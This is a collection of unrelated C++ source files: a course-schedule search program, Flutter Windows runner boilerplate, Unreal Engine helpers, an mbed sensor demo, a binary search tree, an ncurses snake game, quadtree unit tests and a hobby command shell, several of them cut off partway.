    "//\n//\n//  SchoolScheduleSearch\n//\n//  Created by Elsa Abbas\n//  This Program searches through DVC schedule text and displays information about a course.\n\n//C++ libraries\n#include <iostream>\n#include <fstream>\n#include <map>\n#include <set>\n#include <string>\nusing namespace std;\n\n//C libraries\n#include <cstring>\n\nint main(int argc, const char * argv[])\n{\n\n    \n    //variable defintion\n    map<string, set<int> > allClass;\n    char* token; //to allow parsing file\n    char buf[100];  //to store input from file for parsing\n    const char* const tab = \"\\t\";\n    string course;\n\n    //open input file\n    ifstream fin;\n    fin.open(\"dvc-schedule.txt\");\n    //check if file opened\n    if (!fin.good())\n        cout << \"I/O error. Can't find file!\\n\";\n    \n    //read the input file\n    while (fin.good())\n    {\n        //read the line\n        string line; //to hold input from file\n        getline(fin, line);\n        strcpy(buf, line.c_str()); //copy line to buff\n        if (buf[0] == 0) continue; //skip blank lines\n        //parse line\n        const string term(token = strtok(buf, tab));\n        const string section((token = strtok(0, tab)) ? token: \"\");\n        const string course((token = strtok(0, tab)) ? token: \"\");\n        const string instructor((token = strtok(0, tab)) ? token: \"\");\n        const string whenWhere((token = strtok(0, tab)) ? token: \"\");\n        if (course.find('-') == string:: npos) continue; //invalid line if no dash in\n                                                         //course name\n        //copy subject code from course\n        const string subjectCode(course.begin(), course.begin() + course.find('-'));\n        string classCode = term + section; //combine term and section to make class code\n        \n        //convert string term into an int\n        int pos = term.find(' ');\n        const string season = term.substr(0, pos);\n        const string year = term.substr(term.find('2'), string::npos);\n        int termNum;\n        if (season == \"Spring\")\n            termNum = stoi(year) * 10 + 1;\n        else if (season == \"Summer\")\n            termNum = stoi(year) * 10 + 2;\n        else\n            termNum = stoi(year) * 10 + 3;\n        \n        //add termNum to course\n        allClass[course].insert(termNum);\n    }\n    \n   while (course != \"X\" && course != \"x\")\n   {\n       cout << \"Enter a course name [like COMSC-210] to search for the first\";\n       cout << \u201cand last semester offered [X/x to exit]:\\n\";\n       cin >> course;\n       \n       if (course == \"X\" || course == \"x\") break;\n       if(allClass.find(course) == allClass.end())\n           cout << \"Could not find \" << course << endl << endl;\n       else\n       {\n           //find first term course was offered\n           set<int>::iterator it;\n           it = allClass[course].begin();\n           cout << course << \" was first offered in \";\n           if ((*it % 10) == 1) cout << \"Spring \" << *it / 10;\n           else if ((*it % 10) == 2) cout << \"Summer \" << *it / 10;\n           else cout << \"Fall \" << *it / 10;\n           cout << endl;\n           \n           //find last term course was offered\n           set<int>::reverse_iterator rit;\n           rit = allClass[course].rbegin();\n           cout << course << \" was last offered in \";\n           if ((*rit % 10) == 1) cout << \"Spring \" << *rit / 10;\n           else if ((*rit % 10) == 2) cout << \"Summer \" << *rit / 10;\n           else cout << \"Fall \" << *rit / 10;\n           cout << endl << endl;\n           \n           \n       }\n       \n   }\n    \n    return 0;\n}\n",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"ejemplo_scaffold\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"flutter_vscode\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include \"UESTGameInstance.h\"\n\n// God forgive me\n// UGameInstance::WorldContext is not public, and neither InitializeStandalone nor InitializeForPlayInEditor is suitable for us.\n// So we use this template hack to access WorldContext field.\n// Source: https://ledas.com/post/857-how-to-hack-c-with-templates-and-friends/\nstatic FWorldContext*& FieldGetter(UGameInstance&);\n\ntemplate<typename T, auto T::*Field, typename RetVal>\nstruct Stealer\n{\n\tfriend RetVal& FieldGetter(T& Object)\n\t{\n\t\treturn Object.*Field;\n\t}\n};\n\ntemplate struct Stealer<UGameInstance, &UGameInstance::WorldContext, FWorldContext*>;\n\nvoid IUESTGameInstance::DefaultInitializeForTests(UGameInstance& GameInstance, const bool bRunAsDedicated, const int32 PIEInstance)\n{\n\tconstexpr auto WorldType = WITH_EDITOR ? EWorldType::PIE : EWorldType::Game;\n\n\tauto& WorldContext = GameInstance.GetEngine()->CreateNewWorldContext(WorldType);\n\tWorldContext.OwningGameInstance = &GameInstance;\n\tWorldContext.PIEInstance = PIEInstance;\n\tWorldContext.PIEPrefix = UWorld::BuildPIEPackagePrefix(PIEInstance);\n\n\t// We want to init this before calling UGameInstance::Init\n\tWorldContext.RunAsDedicated = bRunAsDedicated;\n\n\tFieldGetter(GameInstance) = &WorldContext;\n\n\tauto* DummyWorld = UWorld::CreateWorld(WorldType, true);\n\tDummyWorld->SetGameInstance(&GameInstance);\n\tWorldContext.SetCurrentWorld(DummyWorld);\n\n\tGameInstance.Init();\n}\n",
    "/* Includes */\n#include \"mbed.h\"\n#include \"HTS221Sensor.h\"\n#include \"LPS22HBSensor.h\"\n#include \"LSM6DSLSensor.h\"\n#include \"lis3mdl_class.h\"\n#include \"VL53L0X.h\"\n\n// objects for various sensors\nstatic DevI2C devI2c(PB_11,PB_10);\nstatic LPS22HBSensor press_temp(&devI2c);\nstatic HTS221Sensor hum_temp(&devI2c);\nstatic LSM6DSLSensor acc_gyro(&devI2c,0xD4,D4,D5); // high address\nstatic LIS3MDL magnetometer(&devI2c, 0x3C);\nstatic DigitalOut shutdown_pin(PC_6);\nstatic VL53L0X range(&devI2c, &shutdown_pin, PC_7, 0x52);\n\n\n// functions to print sensor data\nvoid print_t_rh(){\n    float value1, value2;\n    hum_temp.get_temperature(&value1);\n    hum_temp.get_humidity(&value2);\n\n    value1=value2=0;    \n    press_temp.get_temperature(&value1);\n    press_temp.get_pressure(&value2);\n    printf(\"LPS22HB: [temp] %.2f C, [press] %.2f mbar\\r\\n\", value1, value2);\n}\n\nvoid print_mag(){\n    int32_t axes[3];\n    magnetometer.get_m_axes(axes);\n    printf(\"LIS3MDL [mag/mgauss]:    %6ld, %6ld, %6ld\\r\\n\", axes[0], axes[1], axes[2]);\n\n}\n\nvoid print_accel(){\n    int32_t axes[3];\n    acc_gyro.get_x_axes(axes);\n    printf(\"LSM6DSL [acc/mg]:        %6ld, %6ld, %6ld\\r\\n\", axes[0], axes[1], axes[2]);\n}\n\nvoid print_gyro(){\n    int32_t axes[3];\n    acc_gyro.get_g_axes(axes);\n    printf(\"LSM6DSL [gyro/mdps]:     %6ld, %6ld, %6ld\\r\\n\", axes[0], axes[1], axes[2]);\n}\n\nvoid print_distance(){\n    uint32_t distance;\n    int status = range.get_distance(&distance);\n    if (status == VL53L0X_ERROR_NONE) {\n        printf(\"VL53L0X [mm]:            %6ld\\r\\n\", distance);\n    } else {\n        printf(\"VL53L0X [mm]:                --\\r\\n\");\n    }\n}\n\n/* Simple main function */\nint main() {\n    uint8_t id;\n    float value1, value2;\n\n    int32_t axes[3];\n\n    hum_temp.init(NULL);\n\n    press_temp.init(NULL);\n    magnetometer.init(NULL);\n    acc_gyro.init(NULL);\n\n    range.init_sensor(0x52);\n\n    hum_temp.enable();\n    press_temp.enable();\n\n    acc_gyro.enable_x();\n    acc_gyro.enable_g();\n  \n    printf(\"\\033[2J\\033[20A\");\n    printf (\"\\r\\n--- Starting new run ---\\r\\n\\r\\n\");\n\n    hum_temp.read_id(&id);\n    printf(\"HTS221  humidity & temperature    = 0x%X\\r\\n\", id);\n\n    press_temp.read_id(&id);\n    printf(\"LPS22HB pressure & temperature    = 0x%X\\r\\n\", id);\n    magnetometer.read_id(&id);\n    printf(\"LIS3MDL magnetometer              = 0x%X\\r\\n\", id);\n    acc_gyro.read_id(&id);\n    printf(\"LSM6DSL accelerometer & gyroscope = 0x%X\\r\\n\", id);\n    \n    printf(\"\\n\\r--- Reading sensor values ---\\n\\r\"); ;\n    print_t_rh();\n    print_mag();\n    print_accel();\n    print_gyro();\n    print_distance();\n    printf(\"\\r\\n\");\n    \n    while(1) {\n        wait_us(500000);\n    }\n}",
    "#include<iostream>\r\nusing namespace std;\r\n\r\n//  Node structure for the BST\r\n\r\nstruct Node{\r\n    int key;\r\n    Node* left;\r\n    Node *right;\r\n\r\n    Node(int k): key(k), left(nullptr), right(nullptr){}\r\n};\r\n\r\n// BST Class\r\n\r\nclass BinarySearrchTree{\r\n\r\npublic:\r\n    BinarySearrchTree(): root(nullptr){}\r\n\r\n    void insert(int key){\r\n        root = insertRecursive(root,key);\r\n    }\r\n\r\n    bool search(int key){\r\n        return searchRecursive(root,key) != nullptr;\r\n    }\r\n\r\n    void inorder(){\r\n        inorderRecursive(root);\r\n        cout << endl;\r\n    }\r\n\r\nprivate:\r\n    Node* root;\r\n\r\n    Node* insertRecursive(Node* node, int key){\r\n        if(node == nullptr){\r\n            return new Node(key);\r\n        }\r\n\r\n        if(key < node->key){\r\n            node->left = insertRecursive(node->left, key);\r\n        }\r\n        else{\r\n            node->right = insertRecursive(node->right,key);\r\n        }\r\n        \r\n        \r\n        return node;\r\n    }\r\n\r\n    Node* searchRecursive(Node* node,int key){\r\n        if(node == nullptr || node->key == key){\r\n            return node;\r\n        }\r\n\r\n        if(key < node->key){\r\n            return searchRecursive(node->left,key);\r\n        }\r\n\r\n        if(key > node->key){\r\n            return searchRecursive(node->right,key);\r\n        }\r\n    }\r\n\r\n    void inorderRecursive(Node* node){\r\n        if(node != nullptr){\r\n            inorderRecursive(node->left);\r\n            cout << node->key << \" \";\r\n            inorderRecursive(node->right);\r\n        }\r\n    }\r\n\r\n};\r\n\r\nint main(){\r\n    BinarySearrchTree bst;\r\n    bst.insert(50);\r\n    bst.insert(30);\r\n    bst.insert(20);\r\n    bst.insert(40);\r\n    bst.insert(70);\r\n    bst.insert(60);\r\n    bst.insert(80);\r\n\r\n\r\n    cout << \"Inorder Treaversal of the BST: \";\r\n    bst.inorder(); // OUTPUT: 20 30 40 50 60 70 80\r\n\r\n    cout << \"Search for 40 : \" << (bst.search(40) ? \"Found\" : \"Not Found \") << endl;\r\n    cout << \"Search for 25: \" << (bst.search(25) ? \"Found\" : \"Not Found \") << endl;\r\n\r\n    return 0;\r\n\r\n}\r\n",
    "// author: Aryanthepain\n#include \"Main.h\"\n\nint main()\n{\n\t// Initialize ncurses\n\tinitscr();\n\tif (stdscr == nullptr)\n\t{\n\t\tcerr << \"Error initializing ncurses.\" << endl;\n\t\treturn 1;\n\t}\n\tcbreak();\t\t\t  // makes ncurses work for a single character\n\tnoecho();\t\t\t  // inout does not display on terminal\n\tkeypad(stdscr, TRUE); // special keys are able to be input\n\tcurs_set(0);\t\t  // removes cursor\n\t//\ttimeout(100); //waits for getch() for 100ms, otherwise outputs ERR\n\n\tint start_x, start_y;\n\tgetmaxyx(stdscr, start_y, start_x);\n\n\t// menu screen\n\tWINDOW *menu = newwin(start_y, start_x, 0, 0);\n\tif (menu == nullptr)\n\t{\n\t\tendwin();\n\t\tcerr << \"Error creating menu window.\" << endl;\n\t\treturn 1;\n\t}\n\trefresh();\n\n\t// menu mode\n\tMODE mode;\n\tmode = display_menu(menu);\n\n\tWINDOW *win = newwin(min(20, 2 * start_y / 3), min(50, 2 * start_x / 3), 1, 0);\n\tint max_x, max_y;\n\tgetmaxyx(win, max_y, max_x);\n\n\tmvwprintw(stdscr, 0, (max_x - 26) / 2, \"SNAKES GAME BY ARYAN GUPTA\");\n\trefresh();\n\tbox(win, 0, 0);\n\twrefresh(win);\n\n\t// game mode based on which mode is chosen\n\tif (mode == single)\n\t\tsp_game(stdscr, win, max_x, max_y);\n\telse\n\t\tmp_game(stdscr, win, max_x, max_y);\n\n\t// quit screen\n\tmvwprintw(win, max_y / 2, max_x / 3, \"GAME OVER!\");\n\twrefresh(win);\n\n\t// delay after game ends to prevent accidental clicks\n\tnapms(2000);\n\tmvwprintw(win, max_y / 2 + 2, max_x / 3 - 5, \"Press any key to continue\");\n\twrefresh(win);\n\ttimeout(-1);\n\tgetch();\n\n\t// Cleanup\n\tendwin();\n\treturn 0;\n}\n",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"first\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include \"quadtree.hpp\"\n\n#include <catch2/catch_test_macros.hpp>\n#include <unordered_set>\n\nTEST_CASE(\"simple square 8x8\") {\n  quadtree::SplitingStopper ssf = [](int w, int h, int n) { return (w <= 2 && h <= 2) || n <= 1; };\n  quadtree::Quadtree<int> tree(8, 8, ssf);\n  REQUIRE(tree.NumNodes() == 0);\n  REQUIRE(tree.NumLeafNodes() == 0);\n  REQUIRE(tree.Depth() == 0);\n  tree.Build();\n  REQUIRE(tree.NumNodes() == 1);\n  REQUIRE(tree.NumLeafNodes() == 1);\n  REQUIRE(tree.Depth() == 0);\n  REQUIRE(tree.NumObjects() == 0);\n  // Add (2,3)\n  tree.Add(2, 3, 1);\n  REQUIRE(tree.NumNodes() == 1);\n  REQUIRE(tree.NumLeafNodes() == 1);\n  REQUIRE(tree.NumObjects() == 1);\n  // Add(3,4)\n  tree.Add(3, 4, 1);\n  REQUIRE(tree.NumNodes() == 5);\n  REQUIRE(tree.NumLeafNodes() == 4);\n  REQUIRE(tree.Depth() == 1);\n  REQUIRE(tree.NumObjects() == 2);\n  // Add(1,5)\n  tree.Add(1, 5, 1);\n  REQUIRE(tree.NumNodes() == 1 + 4 + 4);\n  REQUIRE(tree.NumLeafNodes() == 3 + 4);\n  REQUIRE(tree.Depth() == 2);\n  REQUIRE(tree.NumObjects() == 3);\n  // Add(0,4)\n  tree.Add(0, 4, 1);\n  REQUIRE(tree.NumNodes() == 1 + 4 + 4);\n  REQUIRE(tree.NumLeafNodes() == 3 + 4);\n  REQUIRE(tree.Depth() == 2);\n  REQUIRE(tree.NumObjects() == 4);\n  // Find (5,2)\n  auto node1 = tree.Find(5, 2);\n  REQUIRE(node1 != nullptr);\n  REQUIRE(node1->x1 == 4);\n  REQUIRE(node1->y1 == 0);\n  REQUIRE(node1->x2 == 7);\n  REQUIRE(node1->y2 == 3);\n  // Find (0,0)\n  auto node2 = tree.Find(0, 0);\n  REQUIRE(node2 != nullptr);\n  REQUIRE(node2->x1 == 0);\n  REQUIRE(node2->y1 == 0);\n  REQUIRE(node2->x2 == 3);\n  REQUIRE(node2->y2 == 3);\n  // Find(-1,10) , out of boundary\n  auto node3 = tree.Find(-1, 10);\n  REQUIRE(node3 == nullptr);\n  // QueryRange (hit 2)\n  quadtree::Objects<int> nodes1;\n  decltype(tree)::CollectorT c1 = [&nodes1](int x, int y, int o) { nodes1.insert({x, y, o}); };\n  tree.QueryRange(1, 2, 4, 4, c1);\n  REQUIRE(nodes1.size() == 2);\n  REQUIRE(nodes1.find({2, 3, 1}) != nodes1.end());\n  REQUIRE(nodes1.find({3, 4, 1}) != nodes1.end());\n  // QueryRange (hit 0)\n  quadtree::Objects<int> nodes2;\n  decltype(tree)::CollectorT c2 = [&nodes2](int x, int y, int o) { nodes2.insert({x, y, o}); };\n  tree.QueryRange(4, 1, 5, 5, c2);\n  REQUIRE(nodes2.size() == 0);\n  // Remove (0,0) // does nothing\n  tree.Remove(0, 0, 1);\n  REQUIRE(tree.NumObjects() == 4);\n  // Remove (1,5) // not affect splition\n  tree.Remove(1, 5, 1);\n  REQUIRE(tree.NumNodes() == 1 + 4 + 4);\n  REQUIRE(tree.NumLeafNodes() == 3 + 4);\n  REQUIRE(tree.Depth() == 2);\n  REQUIRE(tree.NumObjects() == 3);\n  // Remove (3,4), merge\n  tree.Remove(3, 4, 1);\n  REQUIRE(tree.NumNodes() == 1 + 4);\n  REQUIRE(tree.NumLeafNodes() == 4);\n  REQUIRE(tree.Depth() == 1);\n  REQUIRE(tree.NumObjects() == 2);\n  // Remove (2,3), merge\n  tree.Remove(2, 3, 1);\n  REQUIRE(tree.NumNodes() == 1);\n  REQUIRE(tree.NumLeafNodes() == 1);\n  REQUIRE(tree.Depth() == 0);\n  REQUIRE(tree.NumObjects() == 1);\n}\n\nTEST_CASE(\"simple rectangle 7x6\") {\n  quadtree::SplitingStopper ssf = [](int w, int h, int n) { return (w <= 2 && h <= 2) || n <= 1; };\n  quadtree::Quadtree<int> tree(7, 6, ssf);\n  REQUIRE(tree.NumNodes() == 0);\n  REQUIRE(tree.NumLeafNodes() == 0);\n  REQUIRE(tree.Depth() == 0);\n  tree.Build();\n  REQUIRE(tree.NumNodes() == 1);\n  REQUIRE(tree.NumLeafNodes() == 1);\n  REQUIRE(tree.Depth() == 0);\n  REQUIRE(tree.NumObjects() == 0);\n  // Add (4,4)\n  tree.Add(4, 4, 1);\n  REQUIRE(tree.NumNodes() == 1);\n  REQUIRE(tree.NumLeafNodes() == 1);\n  REQUIRE(tree.Depth() == 0);\n  REQUIRE(tree.NumObjects() == 1);\n  // Add (3,3)\n  tree.Add(3, 3, 1);\n  REQUIRE(tree.NumNodes() == 1 + 4);\n  REQUIRE(tree.NumLeafNodes() == 4);\n  REQUIRE(tree.Depth() == 1);\n  REQUIRE(tree.NumObjects() == 2);\n  // Find (0,0)\n  auto a = tree.Find(0, 0);\n  REQUIRE(a != nullptr);\n  REQUIRE(a->x1 == 0);\n  REQUIRE(a->y1 == 0);\n  REQUIRE(a->x2 == 2);\n  REQUIRE(a->y2 == 3);\n  REQUIRE(a->d == 1);\n  // Find (1,5)\n  auto b = tree.Find(1, 5);\n  REQUIRE(b != nullptr);\n  REQUIRE(b->x1 == 0);\n  REQUIRE(b->y1 == 4);\n  REQUIRE(b->x2 == 2);\n  REQUIRE(b->y2 == 6);\n  REQUIRE(b->d == 1);\n  // Find (3,3)\n  auto c = tree.Find(3, 3);\n  REQUIRE(c != nullptr);\n  REQUIRE(c->x1 == 3);\n  REQUIRE(c->y1 == 0);\n  REQUIRE(c->x2 == 5);\n  REQUIRE(c->y2 == 3);\n  REQUIRE(c->d == 1);\n  // Find (4,4)\n  auto d = tree.Find(4, 4);\n  REQUIRE(d != nullptr);\n  REQUIRE(d->x1 == 3);\n  REQUIRE(d->y1 == 4);\n  REQUIRE(d->x2 == 5);\n  REQUIRE(d->y2 == 6);\n  REQUIRE(d->d == 1);\n  // Add (1,2)\n  tree.Add(1, 2, 1);\n  REQUIRE(tree.NumNodes() == 1 + 4);\n  REQUIRE(tree.NumLeafNodes() == 4);\n  REQUIRE(tree.Depth() == 1);\n  REQUIRE(tree.NumObjects() == 3);\n  // Add (1,3)\n  tree.Add(1, 3, 1);\n  REQUIRE(tree.NumNodes() == 1 + 4 + 4);\n  REQUIRE(tree.NumLeafNodes() == 4 + 3);\n  REQUIRE(tree.Depth() == 2);\n  REQUIRE(tree.NumObjects() == 4);\n  // Add (0,2)\n  tree.Add(0, 2, 1);\n  REQUIRE(tree.NumNodes() == 1 + 4 + 4);\n  REQUIRE(tree.NumLeafNodes() == 4 + 3);\n  REQUIRE(tree.Depth() == 2);\n  REQUIRE(tree.NumObjects() == 5);\n  // Add (1,5)\n  tree.Add(1, 5, 1);\n  REQUIRE(tree.NumNodes() == 1 + 4",
    "#include \"main.h\"\nbool started = false;\nint main() {\n    if (!started) {\n\t\tstarted = true;\n        std::cout << \"___________                  .__              .__   \" << std::endl;\n        std::cout << \"\\\\__    ___/__________  _____ |__| ____ _____  |  |  \" << std::endl;\n        std::cout << \"  |    |_/ __ \\\\_  __ \\\\/     \\\\|  |/    \\\\\\\\__  \\\\ |  |  \" << std::endl;\n        std::cout << \"  |    |\\\\  ___/|  | \\\\/  Y Y  \\\\  |   |  \\\\/ __ \\\\|  |__\" << std::endl;\n        std::cout << \"  |____| \\\\___  >__|  |__|_|  /__|___|  (____  /____/\" << std::endl;\n        std::cout << \"             \\\\/            \\\\/        \\\\/     \\\\/      \" << std::endl;\n\t}\n    char currentPath[MAX_PATH];\n    GetCurrentDirectoryA(MAX_PATH, currentPath);\n    std::string path(currentPath);\n    std::cout << path << \": \";\n    std::string input;\n    std::getline(std::cin, input);\n    executeCommand(input);\n    return 0;\n}\n\nvoid executeCommand(const std::string& command) {\n    std::stringstream ss(command);\n    std::string cmd;\n    std::vector<std::string> args;\n    while (ss >> cmd) {\n        args.push_back(cmd);\n    }\n    History.insert(History.end(), args.begin(), args.end());\n\n    if (args.empty()) {\n        std::cout << \"No command entered\\n\";\n        main();\n        return;\n    }\n\n    const std::string& cmdName = args[0];\n\n    if (cmdName == \"help\") {\n        help();\n    }\n    else if (cmdName == \"fcreate\") {\n        if(args.size() < 2) {\n\t\t\tstd::cout << \"Usage: fcreate <file>\\n\";\n\t\t\tmain();\n\t\t}\n\t\telse {\n\t\t\tfcreate(args[1]);\n\t\t}\n    }\n    else if (cmdName == \"fdelete\") {\n        if (args.size() < 2) {\n\t\t\tstd::cout << \"Usage: fdelete <file>\\n\";\n\t\t\tmain();\n\t\t}\n\t\telse {\n\t\t\tfdelete(args[1]);\n\t\t\n        }\n    }\n    else if (cmdName == \"dcreate\") {\n        if (args.size() < 2) {\n            std::cout << \"Usage: dcreate <directory>\\n\";\n            main();\n        }\n        else {\n            dcreate(args[1]);\n        }\n    }\n    else if (cmdName == \"close\") {\n        close();\n    }\n    else if (cmdName == \"color\" || cmdName == \"cl\") {\n        if (args.size() < 2) {\n            std::cout << \"Example: color A5\";\n            main();\n        }\n        else {\n            color(args[1]);\n        }\n    }\n    else if (cmdName == \"clear\") {\n        clear();\n    }\n    else if (cmdName == \"tim\" || cmdName == \"timecheck\") {\n        tim();\n    }\n    else if (cmdName == \"ls\" || cmdName == \"list\") {\n        ls();\n    }\n    else if (cmdName == \"cd\") {\n        if (args.size() < 2) {\n            std::cout << \"Usage: cd <path>\\n\";\n        }\n        else {\n            cd(args[1]);\n        }\n    }\n    else if (cmdName == \"history\") {\n        history();\n    }\n    else if (cmdName == \"vmload\") {\n        vmload();\n    }\n    else if (cmdName == \"games\") {\n        games();\n    }\n    else if (cmdName == \"git\") {\n        if (args.size() < 2) {\n            std::cout << \"Example: git clone *repo*\" << std::endl;\n            main();\n        }\n        else if (args.size() < 3){\n            git(args[1], \"\");\n        }\n        else {\n            git(args[1], args[2]);\n            main();\n        }\n    }\n    else if (cmdName == \"move\") {\n        if(args.size() < 3){\n\t\t\tstd::cout << \"Usage: move <source> <destination>\\n\";\n\t\t\tmain();\n\t\t}\n\t\telse{\n            if (MoveFileA(args[1].c_str(), args[2].c_str())) {\n\t\t\t\tstd::cout << \"File moved\\n\";\n\t\t\t}\n\t\t\telse{\n\t\t\t\tstd::cout << \"Error moving file\\n\";\n\t\t\t}\n\t\t\tmain();\n\t\t}\n\t}\n\telse if (cmdName == \"run\") {\n\t\tif (args.size() < 2) {\n\t\t\tstd::cout << \"Usage: run <command>\\n\";\n\t\t\tmain();\n\t\t}\n\t\telse {\n\t\t\trun(args[1]);\n\t\t}\n\t}else if (cmdName == \"read\") {\n\t\tif (args.size() < 2) {\n\t\t\tstd::cout << \"Usage: read <file>\\n\";\n\t\t\tmain();\n\t\t}\n\t\telse {\n\t\t\tread(args[1]);\n\t\t}\n\t}\n\telse if (cmdName == \"neofetch\") {\n\t\tneofetch();\n\t\tmain();\n\t}\n    else {\n        std::cout << \"Command not found\\n\";\n        main();\n    }\n}\n\nvoid help() {\n    //list all functions\n    std::cout << \"Available commands:\\n\";\n    std::cout << \"help: Displays this message\\n\";\n    std::cout << \"fcreate <file>: Creates a file\\n\";\n    std::cout << \"fdelete <file>: Deletes a file\\n\";\n    std::cout << \"dcreate <directory>: Creates a directory\\n\";\n    std::cout << \"close: Exits the program\\n\";\n    std::cout << \"color <colorcode>: Changes the console color\\n\";\n    std::cout << \"clear: Clears the console\\n\";\n    std::cout << \"tim: Displays the current time\\n\";\n    std::cout << \"ls: Lists all files in the current directory\\n\";\n    std::cout << \"cd <path>: Changes the current directory\\n\";\n    std::cout << \"history: Displays the command history\\n\";\n    std::cout << \"vmload: Displays the virtual memory used by the program\\n\";\n    std::cout << \"games: Displays the available games\\n\";\n    std::cout << \"git <command> <repo>: Executes a git command\\n\";\n    std::cout << \"move <source> <destination>: Moves a file\\n\";\n    std::cout << \"run <file>: Executes a file\\n\";\n    std::cout << \"neofetch: Displays the neofetch logo\\n\";\n    main();\n}\n\nvoid tim() {\n    time_t t = time(nullptr);\n    struct tm tt;\n    localti",
    "#include \"MultiplayerSessionsSubsystem.h\"\n#include \"OnlineSubsystem.h\"\n#include \"OnlineSessionSettings.h\"\n#include \"Online/OnlineSessionNames.h\"\n\nUMultiplayerSessionsSubsystem::UMultiplayerSessionsSubsystem():\n\tOnCreateSessionDelegate(FOnCreateSessionCompleteDelegate::CreateUObject(this, &ThisClass::OnCreateSession)),\n\tOnFindSessionsDelegate(FOnFindSessionsCompleteDelegate::CreateUObject(this, &ThisClass::OnFindSessions)),\n\tOnJoinSessionDelegate(FOnJoinSessionCompleteDelegate::CreateUObject(this, &ThisClass::OnJoinSession)),\n\tOnDestroySessionDelegate(FOnDestroySessionCompleteDelegate::CreateUObject(this, &ThisClass::OnDestroySession)),\n\tOnStartSessionDelegate(FOnStartSessionCompleteDelegate::CreateUObject(this, &ThisClass::OnStartSession))\n{\n\tif (IOnlineSubsystem* Subsystem = IOnlineSubsystem::Get())\n\t{\n\t\tSessionInterface = Subsystem->GetSessionInterface();\n\n\t\tif (GEngine)\n\t\t{\n\t\t\tGEngine->AddOnScreenDebugMessage(-1, 5.f, FColor::Blue, FString::Printf(TEXT(\"Subsystem: %s\"), *Subsystem->GetSubsystemName().ToString()));\n\t\t}\n\t}\n}\n\nvoid UMultiplayerSessionsSubsystem::CreateSession(int32 NumPublicConnections, FString MatchType)\n{\n\tif (!SessionInterface.IsValid())\n\t{\n\t\t// Broadcast failure\n\t\tMultiplayerOnCreateSessionComplete.Broadcast(false);\n\t\treturn;\n\t}\n\n\t// If a session already exists, destroy it\n\tauto ExistingSession = SessionInterface->GetNamedSession(NAME_GameSession);\n\tif (ExistingSession)\n\t{\n\t\tbCreateSessionOnDestroy = true;\n\t\tLastNumPublicConnections = NumPublicConnections;\n\t\tLastMatchType = MatchType;\n\n\t\tDestroySession();\n\t}\n\n\t// Register callback, storing delegate handle for later removal\n\tOnCreateSessionHandle = SessionInterface->AddOnCreateSessionCompleteDelegate_Handle(OnCreateSessionDelegate);\n\n\t// Create session\n\tLastSessionSettings = MakeShareable(new FOnlineSessionSettings());\n\tLastSessionSettings->bIsLANMatch = IOnlineSubsystem::Get()->GetSubsystemName() == \"NULL\" ? true : false;\n\tLastSessionSettings->NumPublicConnections = NumPublicConnections;\n\tLastSessionSettings->bAllowJoinInProgress = true;\n\tLastSessionSettings->bUsesPresence = 